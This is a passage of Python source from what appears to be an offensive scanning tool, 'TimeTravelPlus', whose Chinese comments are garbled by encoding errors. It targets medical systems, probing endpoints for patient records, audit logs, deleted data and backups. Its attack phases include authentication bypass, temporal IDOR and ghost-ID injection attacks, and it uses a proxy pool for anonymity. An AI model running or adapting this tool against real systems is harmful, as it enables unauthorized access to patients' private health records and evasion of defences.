    """  ç®€å•çš„LRUç¼“å­˜å®ç° - é˜²æ­¢å†…å­˜æ³„æ¼"""
    
    def __init__(self, maxsize: int = 5000):
        self.maxsize = maxsize
        self.cache = {}
        self.access_order = deque()
    
    def get(self, key: str, default=None):
        if key in self.cache:
            # æ›´æ–°è®¿é—®é¡ºåº
            self.access_order.remove(key)
            self.access_order.append(key)
            return self.cache[key]
        return default
    
    def set(self, key: str, value):
        if key in self.cache:
            # æ›´æ–°ç°æœ‰å€¼
            self.access_order.remove(key)
            self.access_order.append(key)
            self.cache[key] = value
        else:
            # æ·»åŠ æ–°å€¼
            if len(self.cache) >= self.maxsize:
                # ç§»é™¤æœ€å°‘ä½¿ç”¨çš„é¡¹
                oldest = self.access_order.popleft()
                del self.cache[oldest]
            
            self.cache[key] = value
            self.access_order.append(key)
    
    def __contains__(self, key):
        return key in self.cache
    
    def __len__(self):
        return len(self.cache)

class ErrorClassifier:
    """ é”™è¯¯åˆ†ç±»å™¨ - æ™ºèƒ½é”™è¯¯å¤„ç†å’Œåˆ†æ"""
    
    def __init__(self):
        self.error_stats = defaultdict(int)
        self.recoverable_errors = {
            'timeout', 'connection_error', 'rate_limit', 'temporary_server_error'
        }
        self.permanent_errors = {
            'authentication_error', 'authorization_error', 'not_found', 'malformed_request'
        }
    
    def classify_error(self, error: Exception, response_status: Optional[int] = None) -> str:
        """åˆ†ç±»é”™è¯¯ç±»å‹"""
        error_type = type(error).__name__.lower()
        
        # è¶…æ—¶é”™è¯¯
        if 'timeout' in error_type:
            return 'timeout'
        
        # è¿æ¥é”™è¯¯
        elif any(conn_error in error_type for conn_error in ['connection', 'socket', 'ssl']):
            return 'connection_error'
        
        # HTTPçŠ¶æ€ç é”™è¯¯
        elif response_status:
            if response_status == 429:
                return 'rate_limit'
            elif response_status in [500, 502, 503, 504]:
                return 'temporary_server_error'
            elif response_status in [401, 403]:
                return 'authorization_error'
            elif response_status == 404:
                return 'not_found'
            else:
                return 'http_error'
        
        # å…¶ä»–é”™è¯¯
        else:
            return 'unknown_error'
    
    def is_recoverable(self, error_type: str) -> bool:
        """åˆ¤æ–­é”™è¯¯æ˜¯å¦å¯æ¢å¤"""
        return error_type in self.recoverable_errors
    
    def get_retry_delay(self, error_type: str, retry_count: int) -> float:
        """è·å–é‡è¯•å»¶è¿Ÿï¼ˆæŒ‡æ•°é€€é¿ï¼‰"""
        base_delays = {
            'timeout': 1.0,
            'connection_error': 2.0,
            'rate_limit': 5.0,
            'temporary_server_error': 3.0
        }
        
        base_delay = base_delays.get(error_type, 1.0)
        return min(base_delay * (2 ** retry_count), 30.0)  # æœ€å¤§30ç§’å»¶è¿Ÿ

class TimeTravelPlus:
    def __init__(self, target_url, config: TimeTravelConfig = None):
        self.target_url = target_url.rstrip('/')
        self.time_travel_endpoints = []
        
        #   é…ç½®ç®¡ç†
        self.config = config or TimeTravelConfig()
        
        #  æ€§èƒ½ä¼˜åŒ–ï¼šä½¿ç”¨ç»Ÿä¸€æ•°æ®æ¨¡å‹å’Œæ™ºèƒ½ç®¡ç†å™¨
        self.data_records: List[DataRecord] = []  # ç»Ÿä¸€æ•°æ®å­˜å‚¨
        self.memory_manager = MemoryManager(max_records=self.config.DEFAULT_MAX_RECORDS)
        self.request_scheduler = SmartRequestScheduler(self.config)
        
        #   æ€§èƒ½æŒ‡æ ‡
        self.performance_metrics = PerformanceMetrics()
        
        #  æ—¶é—´æ ¼å¼æ™ºèƒ½å­¦ä¹ 
        self.learned_time_formats: Dict[str, float] = {}  # format -> success_rate
        self.server_time_patterns: Set[str] = set()  # ä»æœåŠ¡å™¨å“åº”ä¸­å­¦ä¹ çš„æ¨¡å¼
        
        # P0æ€æ‰‹é”ï¼šIDå¹½çµæ¢æµ‹ - ä¼˜åŒ–ç»“æ„ï¼ˆä½¿ç”¨æœ‰ç•Œé›†åˆé˜²æ­¢å†…å­˜æ³„æ¼ï¼‰
        self.ghost_ids = BoundedSet(max_size=10000)  # ğŸ›¡ï¸ ä¿®å¤å†…å­˜æ³„æ¼é£é™©
        self.id_inference_cache = LRUCache(maxsize=self.config.DEFAULT_LRU_CACHE_SIZE)  #   LRUç¼“å­˜é˜²æ­¢å†…å­˜æ³„æ¼
        
        #   å†…å­˜å®‰å…¨ï¼šä½¿ç”¨æœ‰é™åˆ¶çš„æ•°æ®ç»“æ„é˜²æ­¢å†…å­˜æ³„æ¼
        self.tested_combinations = deque(maxlen=self.config.DEFAULT_TESTED_COMBINATIONS_LIMIT)  # ä½¿ç”¨é…ç½®çš„é™åˆ¶
        self.tested_combinations_set = set()  # å¿«é€ŸæŸ¥æ‰¾ï¼Œé…åˆdequeä½¿ç”¨
        
        # P0æ€æ‰‹é”ï¼šè‡ªåŠ¨Diffå¼•æ“  
        self.current_snapshots = {}  # T0ï¼šå½“å‰æ•°æ®å¿«ç…§
        self.historical_snapshots = {}  # T-1ï¼šå†å²æ•°æ®å¿«ç…§
        self.diff_results = []  # æ•°æ®å˜æ›´è¯æ˜
        
        # P0æ€æ‰‹é”ï¼šç«¯ç‚¹æ™ºèƒ½å˜å¼‚ï¼ˆä½¿ç”¨æœ‰ç•Œé›†åˆé˜²æ­¢å†…å­˜æ³„æ¼ï¼‰
        self.discovered_endpoints = BoundedSet(max_size=5000)  # ğŸ›¡ï¸ ä¿®å¤å†…å­˜æ³„æ¼é£é™©
        
        # WAF Defender çŠ¶æ€
        self.waf_defender = None
        self.waf_defender_initialized = False
        self.waf_stats = {
            'total_requests': 0,
            'waf_detected': 0,
            'fake_responses': 0,
            'protection_rate': 0.0
        }
        
        # å™ªéŸ³è¿‡æ»¤ç»Ÿè®¡
        self.noise_stats = {
            'total_findings': 0,
            'filtered_out': 0,
            'valuable_findings': 0,
            'filter_rate': 0.0
        }
        
        # æ™ºèƒ½é™åˆ¶ç®¡ç†å™¨
        self.limit_manager = SmartLimitManager()
        domain = urlparse(self.target_url).netloc
        target_info = {'domain': domain}
        self.system_size = self.limit_manager.detect_system_size(target_info)
        logging.info(f"[TimeTravelPlus] æ£€æµ‹åˆ°ç³»ç»Ÿè§„æ¨¡: {self.system_size.value}")
        
        # æ—¶é—´æ—…è¡ŒAPIæ¨¡å¼
        self.time_travel_patterns = [
            # ç‰ˆæœ¬æ§åˆ¶
            '/api/{resource}?version=all',
            '/api/{resource}?versions=true',
            '/api/{resource}?include_history=true',
            '/api/{resource}/versions',
            '/api/{resource}/history',
            '/api/{resource}/revisions',
            '/api/v1/{resource}/_history',
            
            # æ—¶é—´ç‚¹æŸ¥è¯¢
            '/api/{resource}?as_of={timestamp}',
            '/api/{resource}?at={timestamp}',
            '/api/{resource}?date={date}',
            '/api/{resource}?time={timestamp}',
            '/api/{resource}?snapshot={date}',
            '/api/{resource}?point_in_time={timestamp}',
            
            # å®¡è®¡æ—¥å¿—
            '/api/audit-log',
            '/api/audit/{resource}',
            '/api/audit-trail/{resource}',
            '/api/activity-log/{resource}',
            '/api/changelog/{resource}',
            '/api/history-log/{resource}',
            '/admin/audit',
            '/system/audit-log',
            
            # å·²åˆ é™¤æ•°æ®
            '/api/{resource}?include_deleted=true',
            '/api/{resource}?show_deleted=true',
            '/api/{resource}?with_deleted=true',
            '/api/{resource}?deleted=true',
            '/api/{resource}/deleted',
            '/api/{resource}/trash',
            '/api/{resource}/recycle-bin',
            
            # å¤‡ä»½å¿«ç…§
            '/api/snapshots',
            '/api/backups',
            '/api/archives',
            '/api/data-snapshots',
            '/api/restore-points',
            
            # å˜æ›´è¿½è¸ª
            '/api/{resource}/changes',
            '/api/{resource}/diffs',
            '/api/{resource}/deltas',
            '/api/{resource}/modifications',
            
            # CDC (Change Data Capture)
            '/api/cdc/{resource}',
            '/api/change-stream/{resource}',
            '/api/event-log/{resource}',
            
            # æ—¶é—´åºåˆ—
            '/api/{resource}/timeseries',
            '/api/{resource}/temporal',
            '/api/{resource}/time-range'
        ]
        
        # åŒ»ç–—ç³»ç»Ÿèµ„æº
        self.medical_resources = [
            'patients', 'patient', 'medical-records', 'medical_records',
            'appointments', 'appointment', 'prescriptions', 'prescription',
            'users', 'user', 'doctors', 'doctor', 'staff',
            'diagnoses', 'diagnosis', 'treatments', 'treatment',
            'lab-results', 'lab_results', 'test-results', 'test_results',
            'medications', 'medication', 'allergies', 'allergy',
            'immunizations', 'immunization', 'vitals', 'vital-signs',
            # æ—¥æ–‡
            'kanja', 'æ‚£è€…', 'yoyaku', 'äºˆç´„', 'shinryo', 'è¨ºç™‚'
        ]
        
        # æ—¶é—´å‚æ•°æ ¼å¼
        self.time_formats = {
            'iso': lambda d: d.isoformat(),
            'iso_z': lambda d: d.isoformat() + 'Z',
            'unix': lambda d: int(d.timestamp()),
            'unix_ms': lambda d: int(d.timestamp() * 1000),
            'date': lambda d: d.strftime('%Y-%m-%d'),
            'datetime': lambda d: d.strftime('%Y-%m-%d %H:%M:%S'),
            'compact': lambda d: d.strftime('%Y%m%d'),
            'compact_time': lambda d: d.strftime('%Y%m%d%H%M%S')
        }
        
        # ç‰ˆæœ¬å‚æ•°
        self.version_params = {
            'version': ['all', 'latest', '*', '-1', '0'],
            'versions': ['true', '1', 'all'],
            'include_history': ['true', '1', 'yes'],
            'include_deleted': ['true', '1', 'yes'],
            'show_deleted': ['true', '1', 'yes'],
            'with_deleted': ['true', '1', 'yes'],
            'deleted': ['true', '1', 'only'],
            'state': ['all', 'deleted', 'any'],
            'status': ['all', 'deleted', 'inactive'],
            'active': ['all', 'false', '0']
        }
        
        # ğŸ”´ å…³é”®ä¿®å¤ï¼šæ·»åŠ ç¼ºå¤±çš„å±æ€§ä»¥é˜²æ­¢AttributeErrorå´©æºƒ
        self.historical_data = []  # å†å²æ•°æ®å­˜å‚¨ï¼ˆè¢«å¤šä¸ªæ–¹æ³•ä½¿ç”¨ä½†ä¹‹å‰æœªåˆå§‹åŒ–ï¼ï¼‰
        self.deleted_records = []  # å·²åˆ é™¤è®°å½•å­˜å‚¨ï¼ˆè¢«find_deleted_data()ä½¿ç”¨ä½†ä¹‹å‰æœªåˆå§‹åŒ–ï¼ï¼‰
        
        #  æ ¸å¿ƒä¸‰ä»¶å¥—ï¼šæ—¶é—´æ—…è¡Œæ”»å‡»å¼•æ“
        self.session_time_skewer = SessionTimeSkewer()          # Sessionæ—¶é—´æ‰­æ›²å™¨ â­â­â­â­â­
        self.api_version_downgrader = APIVersionDowngrader()    # APIç‰ˆæœ¬é™çº§å™¨ â­â­â­â­
        self.diff_analyzer = DiffAnalyzer()                     # å·®å¼‚åˆ†æå¼•æ“ â­â­â­â­â­
        
        #  P0æ ¸å¿ƒå¼•æ“ï¼šä¸»åŠ¨&è¢«åŠ¨æ”»å‡»å¼•æ“ - å…³é”®è¡¥å®Œ
        self.active_manipulation_engine = self.ActiveManipulationEngine(self)  # ä¸»åŠ¨æ“ä½œå¼•æ“ â­â­â­â­â­
        self.passive_mining_engine = self.PassiveMiningEngine(self)             # è¢«åŠ¨æŒ–æ˜å¼•æ“ â­â­â­â­â­
        
        #  é«˜çº§åŠŸèƒ½ç»„ä»¶ï¼šå¢å¼ºæ”»å‡»èƒ½åŠ›
        self.chain_tracking_manager = self.ChainTrackingManager(self)           # é“¾å¼è¿½è¸ªç®¡ç†å™¨
        self.request_bypass_enhancer = self.RequestBypassEnhancer()             # è¯·æ±‚ç»•è¿‡å¢å¼ºå™¨
        self.simple_proxy_pool = self.SimpleProxyPool()                         # ç®€å•ä»£ç†æ± 
        self.auth_manager = self.AuthenticationManager()                        # è®¤è¯ç®¡ç†å™¨
        self.japan_compliance_analyzer = self.JapanMedicalComplianceAnalyzer()  # æ—¥æœ¬åŒ»ç–—åˆè§„åˆ†æå™¨
        
        print(f"[âœ“] TimeTravelPlusåˆå§‹åŒ–å®Œæˆï¼Œå·²ä¿®å¤AttributeErroré—®é¢˜")
        print(f"[] æ ¸å¿ƒä¸‰ä»¶å¥—å·²è£…è½½ï¼šSessionæ‰­æ›²å™¨ã€ç‰ˆæœ¬é™çº§å™¨ã€å·®å¼‚åˆ†æå¼•æ“")
        print(f"[] P0æ ¸å¿ƒå¼•æ“å·²è£…è½½ï¼šä¸»åŠ¨æ“ä½œå¼•æ“ã€è¢«åŠ¨æŒ–æ˜å¼•æ“")
        print(f"[] é«˜çº§ç»„ä»¶å·²è£…è½½ï¼šé“¾å¼è¿½è¸ªã€è¯·æ±‚ç»•è¿‡ã€ä»£ç†æ± ã€è®¤è¯ç®¡ç†ã€åˆè§„åˆ†æ")

    def migrate_historical_data(self):
        """ æ•°æ®æ¨¡å‹è¿ç§»ï¼šå°†historical_dataè¿ç§»åˆ°ç»Ÿä¸€çš„DataRecordæ¨¡å‹"""
        if not self.historical_data:
            return  # æ²¡æœ‰æ•°æ®éœ€è¦è¿ç§»
        
        print(f"[] å¼€å§‹è¿ç§» {len(self.historical_data)} æ¡å†å²æ•°æ®åˆ°ç»Ÿä¸€æ¨¡å‹...")
        migrated_count = 0
        
        for item in self.historical_data:
            if isinstance(item, dict) and 'type' in item:
                try:
                    record = DataRecord(
                        record_id=f"migrated_{migrated_count}_{int(time.time())}",
                        record_type=item['type'],
                        data=item.get('data', item),
                        source_url=item.get('url', self.target_url),
                        timestamp=item.get('timestamp', datetime.now().isoformat()),
                        metadata={
                            'migration_source': 'historical_data',
                            'original_item': item,
                            'migrated_at': datetime.now().isoformat()
                        }
                    )
                    
                    # æ£€æŸ¥å»é‡
                    if not self.memory_manager.is_duplicate(record):
                        self.data_records.append(record)
                        migrated_count += 1
                        
                except Exception as e:
                    print(f"[] æ•°æ®è¿ç§»å¤±è´¥: {e}")
        
        # æ¸…ç©ºæ—§æ•°æ®ç»“æ„ï¼Œé‡Šæ”¾å†…å­˜
        old_count = len(self.historical_data)
        self.historical_data.clear()
        
        print(f"[] æ•°æ®è¿ç§»å®Œæˆ: {migrated_count}/{old_count} æ¡è®°å½•å·²è¿ç§»åˆ°ç»Ÿä¸€æ¨¡å‹")
        print(f"[] å½“å‰æ•°æ®è®°å½•æ€»æ•°: {len(self.data_records)}")

    async def run(self):
        """ä¸»æ‰§è¡Œå‡½æ•°"""
        print(f"[*] å¼€å§‹æ—¶é—´æ—…è¡ŒPlusæ”»å‡»: {self.target_url}")
        print(f"[*] æ—¶é—´: {datetime.now()}")
        
        # åˆå§‹åŒ– WAF Defender
        await self._initialize_waf_defender()
        
        #  æ•°æ®æ¨¡å‹ç»Ÿä¸€ï¼šè¿ç§»å†å²æ•°æ®åˆ°æ–°çš„ç»Ÿä¸€æ¨¡å‹
        self.migrate_historical_data()
        
        #  Phase 1: è¢«åŠ¨æ”¶é›† - å»ºç«‹æ—¶é—´è½´
        print("\n" + "="*60)
        print(" Phase 1: è¢«åŠ¨æ”¶é›†é˜¶æ®µ - å»ºç«‹æ—¶é—´è½´")
        print("="*60)
        
        # 1. å‘ç°æ—¶é—´æ—…è¡Œç«¯ç‚¹
        await self.discover_time_travel_endpoints()
        
        # 2. APIç‰ˆæœ¬å‘ç°ä¸é™çº§æ”»å‡»
        await self.api_version_discovery_attack()
        
        # P0æ€æ‰‹é”1ï¼šIDå¹½çµæ¢æµ‹ï¼ˆä»å®¡è®¡æ—¥å¿—æ”¶é›†å·²åˆ é™¤IDï¼‰
        await self.ghost_id_discovery()
        
        # P0æ€æ‰‹é”2ï¼šç«¯ç‚¹æ™ºèƒ½å˜å¼‚
        await self.intelligent_endpoint_mutation()
        
        # P0æ€æ‰‹é”3ï¼šè‡ªåŠ¨Diffå¼•æ“ - è·å–å½“å‰å¿«ç…§(T0)
        await self.capture_current_snapshots()
        
        # 2. æµ‹è¯•ç‰ˆæœ¬æ§åˆ¶åŠŸèƒ½
        await self.test_version_control()
        
        # 3. æµ‹è¯•æ—¶é—´ç‚¹æŸ¥è¯¢
        await self.test_point_in_time_queries()
        
        # 4. è·å–å®¡è®¡æ—¥å¿—
        await self.get_audit_logs()
        
        # 5. æŸ¥æ‰¾å·²åˆ é™¤æ•°æ®
        await self.find_deleted_data()
        
        # P0æ€æ‰‹é”ï¼šå¹½çµIDæ³¨å…¥æ”»å‡»
        await self.ghost_id_injection_attack()
        
        # P0æ€æ‰‹é”3ï¼šè‡ªåŠ¨Diffå¼•æ“ - è·å–å†å²å¿«ç…§(T-1)
        await self.get_historical_snapshots()
        
        #  Phase 2: Diffåˆ†æ - æå–æƒ…æŠ¥
        print("\n" + "="*60)
        print(" Phase 2: Diffåˆ†æé˜¶æ®µ - æå–æƒ…æŠ¥")
        print("="*60)
        await self.auto_diff_engine()
        await self.enhanced_diff_analysis()
        
        #  Phase 3: ä¸»åŠ¨æ”»å‡» - ç²¾å‡†æ‰“å‡»
        print("\n" + "="*60)
        print(" Phase 3: ä¸»åŠ¨æ”»å‡»é˜¶æ®µ - ç²¾å‡†æ‰“å‡»")
        print("="*60)
        
        #  åŒ»ç–—ç³»ç»Ÿä¸“é¡¹æ£€æµ‹ - é‡è¦ç¼ºå¤±åŠŸèƒ½è¡¥é½
        medical_findings = await self.medical_system_detection()
        
        # ğŸ‡¯ğŸ‡µ æ—¥æœ¬åŒ»ç–—åˆè§„æ€§åˆ†æ - ä¸“é¡¹åˆè§„æ£€æµ‹
        japan_compliance_results = await self.japan_compliance_analyzer.analyze_japan_medical_compliance(self.target_url)
        
        #  é“¾å¼è¿½è¸ªå‘ç° - å‘ç°äº’è”èµ„äº§
        interconnected_assets = await self.chain_tracking_manager.discover_interconnected_assets([self.target_url])
        
        #  è®¤è¯å‘ç°ä¸ç»•è¿‡æ”»å‡» - å®Œæ•´è®¤è¯æ”»å‡»æµç¨‹
        auth_methods = await self.auth_manager.discover_authentication_methods(self.target_url)
        auth_bypass_results = []
        for method in self.auth_manager.discovered_auth_methods:
            bypass_attempts = await self.auth_manager.attempt_authentication_bypass(self.target_url, method)
            auth_bypass_results.extend(bypass_attempts)
        
        #  ä»£ç†æ± éªŒè¯ä¸é›†æˆ - å¢å¼ºåŒ¿åæ€§
        working_proxies = await self.simple_proxy_pool.validate_proxies()
        print(f"[] ä»£ç†æ± çŠ¶æ€: {len(working_proxies)} ä¸ªå¯ç”¨ä»£ç†")
        
        #  P0æ ¸å¿ƒå¼•æ“ï¼šä¸»åŠ¨æ“ä½œå¼•æ“ - æ‰§è¡Œä¸»åŠ¨æ”»å‡»
        active_campaign_results = await self.active_manipulation_engine.execute_active_manipulation_campaign()
        
        #  P0æ ¸å¿ƒå¼•æ“ï¼šè¢«åŠ¨æŒ–æ˜å¼•æ“ - æ™ºèƒ½æƒ…æŠ¥æŒ–æ˜  
        passive_mining_results = await self.passive_mining_engine.execute_passive_mining_campaign()
        
        # â° Sessionæ—¶é—´æ‰­æ›²æ”»å‡» - å¢å¼ºæ‰§è¡Œ
        await self.session_time_skewing_attack()
        
        # P1å¢å¼ºï¼šæ·±åº¦é€’å½’å‘ç°
        await self.deep_recursive_discovery()
        
        # P1å¢å¼ºï¼šæ—¶åºIDORæ”»å‡»
        await self.temporal_idor_attack()
        
        # 7. åˆ†æå˜æ›´è®°å½•
        await self.analyze_change_records()
        
        #  ç»¼åˆç»Ÿè®¡æŠ¥å‘Š
        print(f"\n[] æ”»å‡»å¼•æ“æ‰§è¡Œç»“æœ:")
        print(f"    åŒ»ç–—ç³»ç»Ÿå‘ç°: {len(medical_findings) if medical_findings else 0}")
        print(f"    æ—¥æœ¬åˆè§„é—®é¢˜: {len(japan_compliance_results.get('compliance_violations', []))}")
        print(f"    äº’è”èµ„äº§å‘ç°: {len(interconnected_assets)}")
        print(f"    è®¤è¯æ–¹æ³•å‘ç°: {len(auth_methods.get('endpoints', []))}")
        print(f"    è®¤è¯ç»•è¿‡æˆåŠŸ: {len([r for r in auth_bypass_results if r.get('success', False)])}")
        print(f"    ä¸»åŠ¨æ“ä½œæ€»æ•°: {active_campaign_results.get('total_manipulations', 0)}")
        print(f"    è¢«åŠ¨æƒ…æŠ¥é¡¹ç›®: {passive_mining_results.get('intelligence_items', 0)}")
        
        # 8. ç”ŸæˆæŠ¥å‘Š
        self.generate_report()
        
        return self.data_records

    async def _initialize_waf_defender(self):
        """åˆå§‹åŒ– WAF Defender"""
        if not WAF_DEFENDER_AVAILABLE or self.waf_defender_initialized:
            return
        
        try:
            print("[*] åˆå§‹åŒ– WAF Defender...")
            # åˆ›å»ºä¸€ä¸ªä¸´æ—¶sessionæ¥åˆå§‹åŒ–WAF Defenderï¼ˆä½¿ç”¨ç³»ç»Ÿä»£ç†ï¼‰
            async with aiohttp.ClientSession() as session:
                self.waf_defender = await create_waf_defender(self.target_url, session)
                self.waf_defender_initialized = True
                print("[+] WAF Defender åˆå§‹åŒ–æˆåŠŸ")
        except Exception as e:
            print(f"[!] WAF Defender åˆå§‹åŒ–å¤±è´¥: {e}")

    async def _validate_response_with_waf(self, url, response, context='time_travel'):
        """ä½¿ç”¨WAF DefenderéªŒè¯å“åº”"""
        if not self.waf_defender:
            return True
        
        try:
            self.waf_stats['total_requests'] += 1
            is_real = await self.waf_defender.simple_validate(url, response)
            
            if not is_real:
                self.waf_stats['waf_detected'] += 1
                self.waf_stats['fake_responses'] += 1
                print(f"      WAFæ¬ºéª—æ£€æµ‹: è·³è¿‡ä¼ªé€ å“åº” {url}")
                return False
            return True
        except Exception as e:
            print(f"    WAFéªŒè¯å¼‚å¸¸: {e}")
            return True  # éªŒè¯å¼‚å¸¸æ—¶ä¿å®ˆå¤„ç†

    def _filter_time_travel_finding(self, finding: dict) -> bool:
        """è¿‡æ»¤æ—¶é—´æ—…è¡Œå‘ç°ä¸­çš„å™ªéŸ³"""
        if not NOISE_FILTER_AVAILABLE:
            return True
        
        self.noise_stats['total_findings'] += 1
        
        # æ£€æŸ¥URLæ˜¯å¦ä¸ºç¬¬ä¸‰æ–¹æœåŠ¡
        url = finding.get('url', '')
        if third_party_blacklist.is_third_party(url):
            self.noise_stats['filtered_out'] += 1
            return False
        
        # æ£€æŸ¥æ˜¯å¦ä¸ºæ˜æ˜¾çš„å™ªéŸ³
        if third_party_blacklist.is_obvious_noise(url):
            self.noise_stats['filtered_out'] += 1
            return False
        
        # æ£€æŸ¥æ˜¯å¦æœ‰å®‰å…¨ä»·å€¼
        if not third_party_blacklist.has_security_value(finding):
            self.noise_stats['filtered_out'] += 1
            return False
        
        self.noise_stats['valuable_findings'] += 1
        return True

    async def discover_time_travel_endpoints(self):
        """å‘ç°æ—¶é—´æ—…è¡Œç«¯ç‚¹"""
        print("[+] å‘ç°æ—¶é—´æ—…è¡Œç«¯ç‚¹...")
        
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            tasks = []
            
            # æµ‹è¯•æ¯ä¸ªèµ„æºçš„æ¯ä¸ªæ¨¡å¼
            for resource in self.medical_resources[:10]:  # é™åˆ¶èµ„æºæ•°
                for pattern in self.time_travel_patterns:
                    # æ›¿æ¢èµ„æºå
                    if '{resource}' in pattern:
                        url_pattern = pattern.replace('{resource}', resource)
                    else:
                        url_pattern = pattern
                        
                    # æ›¿æ¢æ—¶é—´å‚æ•°
                    now = datetime.now()
                    yesterday = now - timedelta(days=1)
                    
                    url_pattern = url_pattern.replace('{timestamp}', str(int(now.timestamp())))
                    url_pattern = url_pattern.replace('{date}', now.strftime('%Y-%m-%d'))
                    
                    url = urljoin(self.target_url, url_pattern)
                    tasks.append(self.check_time_travel_endpoint(session, url, resource, pattern))
                    
            # æ‰¹é‡æ‰§è¡Œ
            results = await asyncio.gather(*tasks)
            
            # æ”¶é›†æœ‰æ•ˆç«¯ç‚¹
            self.time_travel_endpoints = [r for r in results if r is not None]
            
            if self.time_travel_endpoints:
                print(f"[!] å‘ç° {len(self.time_travel_endpoints)} ä¸ªæ—¶é—´æ—…è¡Œç«¯ç‚¹")
                
                # æŒ‰ç±»å‹åˆ†ç»„
                by_type = {}
                for endpoint in self.time_travel_endpoints:
                    ep_type = endpoint['type']
                    if ep_type not in by_type:
                        by_type[ep_type] = []
                    by_type[ep_type].append(endpoint)
                    
                for ep_type, endpoints in by_type.items():
                    print(f"    {ep_type}: {len(endpoints)} ä¸ªç«¯ç‚¹")

    async def check_time_travel_endpoint(self, session, url, resource, pattern):
        """æ£€æŸ¥æ—¶é—´æ—…è¡Œç«¯ç‚¹"""
        try:
            async with session.get(url, timeout=10, ssl=False) as resp:
                if resp.status == 200:
                    # WAFéªŒè¯
                    is_real = await self._validate_response_with_waf(url, resp, 'time_travel_endpoint')
                    if not is_real:
                        return None
                    
                    content_type = resp.headers.get('Content-Type', '')
                    
                    if 'json' in content_type:
                        data = await resp.json()
                        
                        # æ£€æŸ¥æ˜¯å¦è¿”å›äº†æ•°æ®
                        if data and (isinstance(data, list) or (isinstance(data, dict) and len(data) > 0)):
                            # åˆ¤æ–­ç«¯ç‚¹ç±»å‹
                            endpoint_type = 'unknown'
                            
                            if 'version' in pattern or 'history' in pattern:
                                endpoint_type = 'version_control'
                            elif 'as_of' in pattern or 'at=' in pattern:
                                endpoint_type = 'point_in_time'
                            elif 'audit' in pattern:
                                endpoint_type = 'audit_log'
                            elif 'deleted' in pattern or 'trash' in pattern:
                                endpoint_type = 'deleted_data'
                            elif 'snapshot' in pattern or 'backup' in pattern:
                                endpoint_type = 'snapshot'
                            elif 'change' in pattern or 'diff' in pattern:
                                endpoint_type = 'change_tracking'
                                
                            finding = {
                                'url': url,
                                'resource': resource,
                                'pattern': pattern,
                                'type': endpoint_type,
                                'sample_data': data[:5] if isinstance(data, list) else data
                            }
                            
                            # å™ªéŸ³è¿‡æ»¤
                            if self._filter_time_travel_finding(finding):
                                return finding
                            else:
                                return None
                            
        except asyncio.TimeoutError:
            self._log_error('timeout', f"ç«¯ç‚¹æ£€æŸ¥è¶…æ—¶: {url}")
        except aiohttp.ClientError as e:
            self._log_error('client_error', f"HTTPå®¢æˆ·ç«¯é”™è¯¯: {type(e).__name__}: {url}")
        except json.JSONDecodeError as e:
            self._log_error('json_error', f"JSONè§£æé”™è¯¯: {url}")
        except Exception as e:
            self._log_error('unknown_error', f"ç«¯ç‚¹æ£€æŸ¥æœªçŸ¥é”™è¯¯: {type(e).__name__}: {url}")
        return None

    async def test_version_control(self):
        """æµ‹è¯•ç‰ˆæœ¬æ§åˆ¶åŠŸèƒ½"""
        print("\n[+] æµ‹è¯•ç‰ˆæœ¬æ§åˆ¶åŠŸèƒ½...")
        
        version_endpoints = [e for e in self.time_travel_endpoints if e['type'] == 'version_control']
        
        if not version_endpoints:
            print("[-] æœªå‘ç°ç‰ˆæœ¬æ§åˆ¶ç«¯ç‚¹")
            return
            
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            for endpoint in version_endpoints[:5]:  # é™åˆ¶æ•°é‡
                print(f"\n[+] æµ‹è¯•: {endpoint['resource']} ç‰ˆæœ¬æ§åˆ¶")
                
                # å°è¯•è·å–æ‰€æœ‰ç‰ˆæœ¬
                base_url = endpoint['url'].split('?')[0]
                
                for param, values in self.version_params.items():
                    for value in values:
                        test_url = f"{base_url}?{param}={value}"
                        
                        try:
                            async with session.get(test_url, timeout=10) as resp:
                                if resp.status == 200:
                                    data = await resp.json()
                                    
                                    # åˆ†æç‰ˆæœ¬æ•°æ®
                                    if isinstance(data, list) and len(data) > 0:
                                        print(f"[!] è·å–åˆ° {len(data)} ä¸ªç‰ˆæœ¬è®°å½•")
                                        
                                        # æ£€æŸ¥æ˜¯å¦åŒ…å«å†å²ç‰ˆæœ¬
                                        versions = []
                                        for item in data:
                                            if isinstance(item, dict):
                                                # æŸ¥æ‰¾ç‰ˆæœ¬å­—æ®µ
                                                version_fields = ['version', '_version', 'revision', '_rev', 'updated_at', 'modified_at']
                                                
                                                for field in version_fields:
                                                    if field in item:
                                                        versions.append({
                                                            'id': item.get('id', item.get('_id', 'unknown')),
                                                            'version': item[field],
                                                            'data': item
                                                        })
                                                        break
                                                        
                                        if versions:
                                            print(f"[!] å‘ç° {len(versions)} ä¸ªä¸åŒç‰ˆæœ¬")
                                            
                                            self.historical_data.append({
                                                'type': 'version_history',
                                                'resource': endpoint['resource'],
                                                'versions': versions[:10],  # ä¿å­˜å‰10ä¸ª
                                                'total_versions': len(versions)
                                            })
                                            
                                        break
                                        
                        except Exception as e:  # æ³¨æ„ï¼šéœ€è¦ import logging
                                        
                            logging.warning(f"å¼‚å¸¸è¢«å¿½ç•¥: {type(e).__name__}: {str(e)}")
    async def test_point_in_time_queries(self):
        """æµ‹è¯•æ—¶é—´ç‚¹æŸ¥è¯¢"""
        print("\n[+] æµ‹è¯•æ—¶é—´ç‚¹æŸ¥è¯¢...")
        
        time_endpoints = [e for e in self.time_travel_endpoints if e['type'] == 'point_in_time']
        
        if not time_endpoints:
            print("[-] æœªå‘ç°æ—¶é—´ç‚¹æŸ¥è¯¢ç«¯ç‚¹")
            return
            
        # ä½¿ç”¨ç³»ç»Ÿä»£ç†è®¾ç½®
        async with aiohttp.ClientSession() as session:
            for endpoint in time_endpoints[:5]:
                print(f"\n[+] æµ‹è¯•: {endpoint['resource']} æ—¶é—´ç‚¹æŸ¥è¯¢")
                
                base_url = endpoint['url'].split('?')[0]
                
                # ç”Ÿæˆä¸åŒæ—¶é—´ç‚¹
                now = datetime.now()
                time_points = [
                    now - timedelta(days=1),    # æ˜¨å¤©
                    now - timedelta(days=7),    # ä¸€å‘¨å‰
                    now - timedelta(days=30),   # ä¸€æœˆå‰
                    now - timedelta(days=90),   # ä¸‰æœˆå‰
                    now - timedelta(days=365),  # ä¸€å¹´å‰
                    datetime(2023, 1, 1),       # 2023å¹´åˆ
                    datetime(2022, 1, 1),       # 2022å¹´åˆ
                    datetime(2020, 1, 1)        # 2020å¹´åˆ
                ]
                
                historical_records = []
                
